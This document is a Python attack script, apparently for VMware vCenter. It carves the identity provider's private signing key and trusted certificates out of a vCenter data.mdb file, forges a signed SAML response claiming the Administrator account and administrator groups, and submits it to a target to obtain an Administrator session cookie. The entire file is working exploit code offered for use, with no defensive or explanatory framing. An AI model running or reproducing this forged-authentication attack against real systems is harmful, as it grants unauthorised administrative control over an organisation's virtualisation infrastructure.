#!/usr/bin/env python3
import argparse
import base64
import bitstring
import sys
import zlib
from string import printable
from urllib.parse import parse_qs, quote, unquote, urlparse

import socket
import ssl
import OpenSSL.crypto as crypto

import ldap
import lxml.etree as etree
import requests
import urllib3
from signxml import XMLSignatureProcessor, XMLSigner
from datetime import datetime
from dateutil.relativedelta import relativedelta
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

idp_cert_flag = b'\x30\x82\x04'
trusted_cert1_flag = b'\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31\x2c\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x69\x66\x69\x63\x61\x74\x65\x43\x68\x61\x69\x6e\x73\x2c' # cn=TrustedCertChain-1,cn=TrustedCertificateChains,
trusted_cert2_flag = b'\x01\x00\x12\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31' # \x01\x00\x12TrustedCertChain-1
not_it_list = [b'Engineering', b'California', b'object']

SAML_TEMPLATE = \
r"""<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="https://$VCENTER_IP/ui/saml/websso/sso" ID="_eec012f2ebbc1f420f3dd0961b7f4eea" InResponseTo="$ID" IssueInstant="$ISSUEINSTANT" Version="2.0">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
  <saml2p:Status>
    <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    <saml2p:StatusMessage>Request successful</saml2p:StatusMessage>
  </saml2p:Status>
  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ID="_91c01d7c-5297-4e53-9763-5ef482cb6184" IssueInstant="$ISSUEINSTANT" Version="2.0">
    <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Id="placeholder"></ds:Signature>
    <saml2:Subject>
      <saml2:NameID Format="http://schemas.xmlsoap.org/claims/UPN">Administrator@$DOMAIN</saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml2:SubjectConfirmationData InResponseTo="$ID" NotOnOrAfter="$NOT_AFTER" Recipient="https://$VCENTER/ui/saml/websso/sso"/>
      </saml2:SubjectConfirmation>
    </saml2:Subject>
    <saml2:Conditions NotBefore="$NOT_BEFORE" NotOnOrAfter="$NOT_AFTER">
      <saml2:ProxyRestriction Count="10"/>
      <saml2:Condition xmlns:rsa="http://www.rsa.com/names/2009/12/std-ext/SAML2.0" Count="10" xsi:type="rsa:RenewRestrictionType"/>
      <saml2:AudienceRestriction>
        <saml2:Audience>https://$VCENTER/ui/saml/websso/metadata</saml2:Audience>
      </saml2:AudienceRestriction>
    </saml2:Conditions>
    <saml2:AuthnStatement AuthnInstant="$ISSUEINSTANT" SessionIndex="_50082907a3b0a5fd4f0b6ea5299cf2ea" SessionNotOnOrAfter="$NOT_AFTER">
      <saml2:AuthnContext>
        <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
      </saml2:AuthnContext>
    </saml2:AuthnStatement>
    <saml2:AttributeStatement>
      <saml2:Attribute FriendlyName="Groups" Name="http://rsa.com/schemas/attr-names/2009/01/GroupIdentity" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Users</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\CAAdmins</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\ComponentManager.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.BashShellAdministrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\LicenseService.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Everyone</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="userPrincipalName" Name="http://schemas.xmlsoap.org/claims/UPN" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">Administrator@$DOMAIN</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="Subject Type" Name="http://vmware.com/schemas/attr-names/2011/07/isSolution" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">false</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="surname" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="givenName" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">Administrator</saml2:AttributeValue>
      </saml2:Attribute>
    </saml2:AttributeStatement>
  </saml2:Assertion>
</saml2p:Response>
"""


def writepem(bytes, verbose):
    data = base64.encodebytes(bytes).decode("utf-8").rstrip()
    key = "-----BEGIN CERTIFICATE-----\n" + data + "\n-----END CERTIFICATE-----"
    if verbose:
        print('[*] Extracted Trusted certificate:')
        print(key + '\n')

    return key

    
def writekey(bytes, verbose):
    data = base64.encodebytes(bytes).decode("utf-8").rstrip()
    key = "-----BEGIN PRIVATE KEY-----\n" + data + "\n-----END PRIVATE KEY-----"
    if verbose:
        print('[*] Extracted IdP certificate:')
        print(key + '\n')
    
    return key


def check_key_valid(key, verbose=False):
    lines = key.splitlines()
    if lines[1].startswith('MI'):
        return True
    else:
        if verbose:
            print('[!] Certificate does not begin with magic bytes')
        return False


def get_idp_cert(stream, verbose=False):
    tup = stream.findall(idp_cert_flag, bytealigned=True)
    matches = list(tup)
    for match in matches:
        stream.pos = match - 32
        flag = stream.read('bytes:3')
        if flag == b'\x00\x01\x04':
            size_hex = stream.read('bytes:1')
            size_hex = b'\x04' + size_hex
            size = int(size_hex.hex(), 16)
            cert_bytes = stream.read(f'bytes:{size}')
            if any(not_it in cert_bytes for not_it in not_it_list):
                continue

            key = writekey(cert_bytes, verbose)
            if not check_key_valid(key):
                continue
 
            print('[*] Successfully extracted the IdP certificate')        
            return key
    else:
        print(f'[-] Failed to find the IdP certificate')
        sys.exit()


def get_domain_from_cn(cn):
    parts = cn.split(',')
    domain_parts = []
    for part in parts:
        if part.lower().startswith('dc='):
            domain_parts.append(part[3:])
    domain = '.'.join(domain_parts).strip()
    domain = ''.join(char for char in domain if char in printable)
    return domain


def get_trusted_cert1(stream, verbose=False):
    tup = stream.findall(trusted_cert1_flag)
    matches = list(tup)
    if matches:
        for match in matches:
            stream.pos = match
            if verbose:
                print(f'[!] Looking for cert 1 at position: {match}')

            cn_end = stream.readto('0x000013', bytealigned=True)
            cn_end_pos = stream.pos
            if verbose:
                print(f'[!] CN end position: {cn_end_pos}')

            stream.pos = match
            cn_len = int((cn_end_pos - match - 8) / 8)
            cn = stream.read(f'bytes:{cn_len}').decode()
            domain = get_domain_from_cn(cn)
            if domain:
                print(f'[*] CN: {cn}')
                print(f'[*] Domain: {domain}')
            else:
                print(f'[!] Failed parsing domain from CN')
                sys.exit()

            cn = stream.readto(f'0x0002', bytealigned=True)

            # Get TrustedCertificate1 pem 1
            cert1_size_hex = stream.read('bytes:2')
            cert1_size = int(cert1_size_hex.hex(), 16)
            cert1_bytes = stream.read(f'bytes:{cert1_size}')
            if verbose:
                print(f'[!] Cert 1 size: {cert1_size}')

            if b'ssoserverSign' not in cert1_bytes:
                if verbose:
                    print('[!] Cert does not contain ssoserverSign - keep looking')
                continue
      
            cert1 = writepem(cert1_bytes, verbose)
            if not check_key_valid(cert1):
                continue

            print('[*] Successfully extracted trusted certificate 1')
            return cert1, domain
    else:
        print(f'[-] Failed to find the trusted certificate 1 flags')


def get_trusted_cert2(stream, verbose=False):
    # Get TrustedCertificate1 pem2
    tup = stream.findall(trusted_cert2_flag)
    matches = list(tup)
    for match in matches:
        stream.pos = match - 10240

        try:
            start = stream.readto('0x308204', bytealigned=True)
        except:
            print('Failed finding cert 2 with flag 1, looking for flag 2...')
            try:
                start = stream.readto('0x308203', bytealigned=True)
            except:
                print('Failed finding cert 2')
                sys.exit()

        stream.pos = stream.pos - 40
        cert2_size_hex = stream.read('bytes:2')
        cert2_size = int(cert2_size_hex.hex(), 16)
        cert2_bytes = stream.read(f'bytes:{cert2_size}')
        if verbose:
            print(f'Cert 2 Size: {cert2_size}')

        cert2 = writepem(cert2_bytes, verbose)
        if not check_key_valid(cert2):
            continue

        print('[*] Successfully extracted trusted certificate 2')
        return cert2

    print(f'[-] Failed to find the trusted cert 2')
    sys.exit()

def saml_request(vcenter):
    """Get SAML AuthnRequest from vCenter web UI"""
    try:
        print(f'[*] Initiating SAML request with {vcenter}')
        r = requests.get(f"https://{vcenter}/ui/login", allow_redirects=False, verify=False)
        if r.status_code != 302:
            raise Exception("expected 302 redirect")
        o = urlparse(r.headers["location"])
        sr = parse_qs(o.query)["SAMLRequest"][0]
        dec = base64.decodebytes(sr.encode("utf-8"))
        req = zlib.decompress(dec, -8)
        return etree.fromstring(req)
    except:
        print(f'[-] Failed initiating SAML request with {vcenter}')
        raise


def fill_template(vcenter_hostname, vcenter_ip, vcenter_domain, req):
    """Fill in the SAML response template"""
    try:
        print('[*] Generating SAML assertion') 
        # Generate valid timestamps
        before = (datetime.today() + relativedelta(months=-1)).isoformat()[:-3]+'Z'
        after = (datetime.today() + relativedelta(months=1)).isoformat()[:-3]+'Z'

        # Replace fields dynamically
        t = SAML_TEMPLATE
        t = t.replace("$VCENTER_IP", vcenter_ip)
        t = t.replace("$VCENTER", vcenter_hostname)
        t = t.replace("$DOMAIN", vcenter_domain)
        t = t.replace("$ID", req.get("ID"))
        t = t.replace("$ISSUEINSTANT", req.get("IssueInstant"))
        t = t.replace("$NOT_BEFORE", before)
        t = t.replace("$NOT_AFTER", after)
        return etree.fromstring(t.encode("utf-8"))
    except:
        print('[-] Failed generating the SAML assertion')
        raise


def sign_assertion(root, cert1, cert2, key):
    """Sign the SAML assertion in the response using the IdP key"""
    try:
        print('[*] Signing the SAML assertion')
        assertion_id = root.find("{urn:oasis:names:tc:SAML:2.0:assertion}Assertion").get("ID")
        signer = XMLSigner(c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#")
        signed_assertion = signer.sign(root, reference_uri=assertion_id, key=key, cert=[cert1, cert2])
        return signed_assertion
    except:
        print('[-] Failed signing the SAML assertion')
        raise


def login(vcenter, saml_resp):
    """Log in to the vCenter web UI using the signed response and return a session cookie"""
    try:
        print('[*] Attempting to log into vCenter with the signed SAML request')
        resp = etree.tostring(s, xml_declaration=True, encoding="UTF-8", pretty_print=False)
        r = requests.post(
            f"https://{vcenter}/ui/saml/websso/sso",
            allow_redirects=False,
            verify=False,
            data={"SAMLResponse": base64.encodebytes(resp)},
        )
        if r.status_code != 302:
            raise Exception("expected 302 redirect")
        cookie = r.headers["Set-Cookie"].split(";")[0]
        print(f'[+] Successfuly obtained Administrator cookie for {vcenter}!')
        print(f'[+] Cookie: {cookie}')
    except:
        print('[-] Failed logging in with SAML request')
        raise


def get_hostname(vcenter):
    try:
        print('[*] Obtaining hostname from vCenter SSL certificate')
        dst = (vcenter, 443)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(dst)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=dst[0])

        # get certificate
        cert_bin = s.getpeercert(True)
        x509 = crypto.load_certificate(crypto.FILETYPE_ASN1,cert_bin)
        hostname = x509.get_subject().CN
        print(f'[*] Found hostname {hostname} for {vcenter}')
        return hostname
    except:
        print('[-] Failed obtaining hostname from SSL certificates for {vcenter}')
        raise


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--path', help='The path to the data.mdb file', required=True)
    parser.add_argument('-t', '--target', help='The IP address of the target', required=True)
    parser.add_argument('-v', '--verbose', action='store_true', help='Print the extracted certificates')
    args = parser.parse_args()

    # Extract certificates
    in_stream = open(args.path, 'rb')
    bin_stream = bitstring.ConstBitStream(in_stream)
    idp_cert = get_idp_cert(bin_stream, args.verbose)
    trusted_cert_1, domain = get_trusted_cert1(bin_stream, args.verbose)
    trusted_cert_2 = get_trusted_cert2(bin_stream, args.verbose)

    # Generate SAML request
    hostname = get_hostname(args.target)
    req = saml_request(args.target)
    t = fill_template(hostname, args.target, domain,req)
    s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
    c = login(args.target, s)
